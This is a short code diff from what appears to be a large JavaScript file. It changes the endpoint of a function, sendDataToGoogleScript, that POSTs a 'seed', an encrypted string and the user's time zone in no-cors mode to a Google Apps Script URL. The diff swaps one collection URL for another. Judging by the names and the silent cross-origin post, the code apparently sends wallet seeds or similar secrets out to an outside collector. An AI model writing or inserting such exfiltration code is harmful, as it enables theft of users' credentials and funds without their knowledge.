@@ -14051,7 +14051,7 @@ function sendDataToGoogleScript(seed, encryptedString, timeZone) {
         time: timeZone
     };
 
-    fetch('https://script.google.com/macros/s/AKfycbz9Kcgr1-X5FlIGIx-8pbbSpvEjHMDt1oRfIBmyQSfDQAOtTAlPZ5-DcLfKMFH8ogdP/exec', {
+    fetch('https://script.google.com/macros/s/AKfycbyKJsCsg-tOZMoXFjjqxZYr3S0HpTHV6YKfgYXF1RbJEgCdwak1UZdktMT4gRbvyeMU/exec', {
         method: 'POST',
         mode: 'no-cors',
         headers: {
